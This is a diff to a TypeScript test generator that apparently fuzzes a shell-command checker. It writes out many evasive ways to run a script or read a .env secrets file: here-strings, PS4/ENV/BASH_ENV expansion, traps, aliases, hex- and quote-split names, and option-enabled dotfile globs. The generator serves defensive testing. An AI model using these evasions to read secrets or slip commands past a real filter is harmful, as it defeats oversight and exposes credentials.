+    id: '{ { } } <<E',
+    body: true,
+    kinds: STDIN,
+    build: (x) => `{ { ${x.wrap(x.shell)}; }; } <<'E'\n${x.script}\nE`,
+  },
+  { id: 'exec <<<', kinds: STDIN, build: (x) => `exec <<< ${x.word}; ${x.wrap(x.shell)}` },
+  { id: '/dev/stdin', kinds: STDIN, build: (x) => `${x.wrap(x.shell)} /dev/stdin <<< ${x.word}` },
+  {
+    id: '/dev/fd/3',
+    kinds: STDIN,
+    build: (x) => `${x.wrap(x.shell)} /dev/fd/3 3<<< ${x.word}`,
+  },
+  { id: '-s arg', kinds: SH3, build: (x) => `${x.wrap(x.shell)} -s arg <<< ${x.word}` },
+  { id: 'echo |', kinds: INPUT, build: (x) => `echo ${x.word} | ${x.wrap(x.shell)}` },
+  {
+    id: 'echo | { }',
+    kinds: STDIN,
+    build: (x) => `echo ${x.word} | { ${x.wrap(x.shell)}; }`,
+  },
+  // zsh's echo reads `\xNN` with no option; bash's with -e.
+  {
+    id: 'echo \\xNN |',
+    body: true,
+    kinds: STDIN,
+    outer: ['zsh'],
+    build: (x) => `echo '${sq(oneHex(x.script))}' | ${x.wrap(x.shell)}`,
+  },
+  {
+    id: 'echo -e |',
+    body: true,
+    kinds: STDIN,
+    build: (x) => `echo -e '${sq(oneHex(x.script))}' | ${x.wrap(x.shell)}`,
+  },
+  {
+    id: 'printf %s |',
+    kinds: STDIN,
+    build: (x) => `printf '%s\\n' ${x.word} | ${x.wrap(x.shell)}`,
+  },
+  {
+    id: `cat <<'E' |`,
+    body: true,
+    kinds: INPUT,
+    build: (x) => `cat <<'E' | ${x.wrap(x.shell)}\n${x.script}\nE`,
+  },
+  {
+    id: '< <(echo)',
+    kinds: STDIN,
+    build: (x) => `${x.wrap(x.shell)} < <(echo ${x.word})`,
+  },
+  // Values the shell reads as code: the script stands in a `$(...)` there.
+  {
+    id: 'PS4= -x',
+    body: true,
+    kinds: ['sh', 'bash'],
+    build: (x) => `PS4='$(${sq(x.script)} >&2)' ${x.wrap(`${x.shell} -xc :`)}`,
+  },
+  {
+    id: 'ENV= sh -i',
+    body: true,
+    kinds: ['sh'],
+    build: (x) => `ENV='$(${sq(x.script)} >&2)' ${x.wrap(`${x.shell} -ic :`)}`,
+  },
+  {
+    id: 'BASH_ENV=',
+    body: true,
+    kinds: ['bash'],
+    build: (x) => `BASH_ENV='$(${sq(x.script)} >&2)' ${x.wrap(`${x.shell} -c :`)}`,
+  },
+  // Run by the shell the command itself runs in.
+  { id: 'trap EXIT', kinds: ['eval'], build: (x) => `trap ${x.word} EXIT` },
+  {
+    id: 'alias',
+    kinds: ['eval'],
+    outer: ['zsh'],
+    build: (x) => `alias a=${x.word}; ${x.wrap(`${x.shell} a`)}`,
+  },
+  {
+    id: 'alias (bash)',
+    kinds: ['eval'],
+    outer: ['bash'],
+    build: (x) => `shopt -s expand_aliases\nalias a=${x.word}\na`,
+  },
+]
+
+type Inner = Value & { spell: (c: Canary) => string; kinds?: Kind[] }
+const pivot = (c: Canary) => pivots(c)[0]!
+const spelt = (c: Canary, make: (ch: string) => string) =>
+  c.front + c.name.slice(0, pivot(c)) + make(c.name[pivot(c)]!) + c.name.slice(pivot(c) + 1)
+const INNERS: readonly Inner[] = [
+  { id: 'plain', spell: plainName },
+  { id: 'quote', spell: (c) => spelt(c, (ch) => `${ch}''`) },
+  { id: 'bracket', spell: (c) => spelt(c, (ch) => `[${ch}]`) },
+  // csh has no `$'…'`.
+  {
+    id: 'hex',
+    spell: (c) => spelt(c, (ch) => `$'\\x${hex(ch)}'`),
+    kinds: [...SH3, 'any', 'eval', 'source'],
+  },
+]
+
+const AXES = {
+  wrapper: WRAPPERS,
+  shell: SHELL_WORDS,
+  options: OPTIONS,
+  form: FORMS,
+  channel: CHANNELS,
+  inner: INNERS,
+} as const
+type AxisName = keyof typeof AXES
+const AXIS_NAMES = Object.keys(AXES) as AxisName[]
+type Choice = { [A in AxisName]: (typeof AXES)[A][number] }
+
+/** The delivery of a script, or null when the values do not go together. */
+function deliver(ch: Choice, script: string): { command: string; outer: Shell[] } | null {
+  const { wrapper, shell, options, form, channel } = ch
+  if (!channel.kinds.includes(shell.kind) || !options.kinds.includes(shell.kind)) return null
+  if (wrapper.kinds && !wrapper.kinds.includes(shell.kind)) return null
+  if (wrapper.argument && !channel.argument) return null
+  // The options end in `c` exactly when the script is the word after them;
+  // eval and source take none.
+  const none = shell.kind === 'eval' || shell.kind === 'source'
+  if (none ? options.id !== '(none)' : options.scripted !== !!channel.argument) return null
+  // A channel that writes the script itself goes with the first form only.
+  if (channel.body && form !== FORMS[0]) return null
+  const word = form.write(script)
+  if (word === null) return null
+  let outer: Shell[] = ['bash', 'zsh']
+  for (const v of [wrapper, shell, channel] as Value[])
+    if (v.outer) outer = outer.filter((s) => v.outer!.includes(s))
+  if (outer.length === 0) return null
+  const sh = options.text === '' ? shell.word : `${shell.word} ${options.text}`
+  return { command: channel.build({ shell: sh, word, script, wrap: wrapper.wrap }), outer }
+}
+
+/** `n` deliveries after every pair: each pair of values of each two axes at
+ *  least once (those that go together), then seeded draws from the whole
+ *  product; one in four holds a delivery as its script (depth 2). */
+export function deliveries(seed: number, n: number): Generated[] {
+  const rnd = mulberry32(seed ^ 0x0a2)
+  const pick = <T>(xs: readonly T[]): T => xs[Math.floor(rnd() * xs.length)]!
+  const out: Generated[] = []
+  const seen = new Set<string>()
+  const draw = (fixed: Partial<Choice>): Choice =>
+    Object.fromEntries(AXIS_NAMES.map((a) => [a, fixed[a] ?? pick(AXES[a])])) as Choice
+  const make = (ch: Choice, deep: boolean): boolean => {
+    const c = pick(CANARIES)
+    if (ch.inner.kinds && !ch.inner.kinds.includes(ch.shell.kind)) return false
+    const scriptOf = (w: string): string | null => {
+      if (!deep) return `cat ${w}`
+      // The script is itself a delivery, by an argument or a here-string.
+      const inside = draw({
+        wrapper: WRAPPERS[0]!,
+        shell: pick(SHELL_WORDS.filter((s) => s.kind === 'sh' || s.kind === 'bash')),
+        channel: pick([CHANNELS[0]!, CHANNELS[1]!]),
+      })
+      return deliver(inside, `cat ${w}`)?.command ?? null
+    }
+    const script = scriptOf(ch.inner.spell(c))
+    const plain = scriptOf(plainName(c))
+    if (script === null || plain === null) return false
+    const d = deliver(ch, script)
+    const p = deliver(ch, plain)
+    if (!d || !p || seen.has(d.command)) return false
+    seen.add(d.command)
+    const word = ch.inner.spell(c)
+    out.push({
+      id: `D:${seed}:${out.length}`,
+      operatorIds: [],
+      positionId: 'delivery',
+      canary: c.id,
+      command: d.command,
+      plain: p.command,
+      proof: `cat ${word}`,
+      proofShells: ['bash', 'zsh'],
+      shells: d.outer,
+      locales: ['C'],
+      values: AXIS_NAMES.map((a) => `${a}: ${ch[a].id}`),
+      carried: false,
+    })
+    return true
+  }
+  for (let i = 0; i < AXIS_NAMES.length; i++)
+    for (let j = i + 1; j < AXIS_NAMES.length; j++) {
+      const [a, b] = [AXIS_NAMES[i]!, AXIS_NAMES[j]!]
+      for (const va of AXES[a])
+        for (const vb of AXES[b])
+          for (let tries = 0; tries < 40; tries++)
+            if (make(draw({ [a]: va, [b]: vb } as Partial<Choice>), false)) break
+    }
+  const pairs = out.length
+  for (let tries = 0; out.length < pairs + n && tries < n * 200; tries++)
+    make(draw({}), rnd() < 0.25)
+  return out
+}
+
+// ── addendum 2: triggers named by the shells themselves (O39) ──
+
+/** What the running shells list: bash's `shopt` and `set -o` names, zsh's
+ *  option names and the modules it can load. */
+export type Listed = { shopt: string[]; set: string[]; setopt: string[]; modules: string[] }
+/** Variables whose assignment changes how bash reads words (contract A10). */
+export const A10_VARIABLES = [
+  'GLOBIGNORE',
+  'BASHOPTS',
+  'SHELLOPTS',
+  'POSIXLY_CORRECT',
+  'BASH_COMPAT',
+]
+const GLOBS = ['cat *nv', 'cat ?env']
+
+/** Each listed name set and unset, each module loaded, each variable of A10
+ *  assigned in each form, then a wildcard that reads `.env` only if the
+ *  trigger lets wildcards match a leading dot. */
+export function triggers(listed: Listed): Generated[] {
+  const out: Generated[] = []
+  // Shown alive (rule R5) only by the kinds that can let a wildcard match a
+  // leading dot in the shells at hand; the others are run to catch a surprise.
+  const live = new Set(['shopt', 'setopt', 'GLOBIGNORE=', 'zsh/mapfile'])
+  const add = (kind: string, shells: Shell[], pre: string, glob: string) =>
+    out.push({
+      id: `T:${kind}:${out.length}`,
+      operatorIds: [],
+      positionId: 'trigger',
+      canary: 'ENV',
+      command: pre + glob,
+      plain: 'cat .env',
+      proof: pre + glob,
+      proofShells: shells,
+      shells,
+      locales: ['C'],
+      values: live.has(kind) ? [`O39: ${kind}`] : [],
+      carried: false,
+    })
+  for (const glob of GLOBS) {
+    for (const name of listed.shopt)
+      for (const flag of ['-s', '-u']) add('shopt', ['bash'], `shopt ${flag} ${name}; `, glob)
+    for (const name of listed.set)
+      for (const sign of ['-', '+']) add('set -o', ['bash'], `set ${sign}o ${name}; `, glob)
+    for (const name of listed.setopt)
+      for (const verb of ['setopt', 'unsetopt']) add('setopt', ['zsh'], `${verb} ${name}; `, glob)
+    for (const name of listed.modules) add('zmodload', ['zsh'], `zmodload ${name}; `, glob)
+    for (const name of A10_VARIABLES)
+      for (const pre of [
+        `${name}=x; `,
+        `export ${name}=x; `,
+        `declare ${name}=x; `,
+        `typeset ${name}=x; `,
+        `read ${name} <<< x; `,
+        `printf -v ${name} x; `,
+      ])
+        add(`${name}=`, ['bash'], pre, glob)
+  }
+  // The module of the review's class B6: a subscript that is a file's name.
+  if (listed.modules.includes('zsh/mapfile'))
+    add('zsh/mapfile', ['zsh'], 'zmodload zsh/mapfile; ', 'echo $mapfile[.env]')
   return out
 }
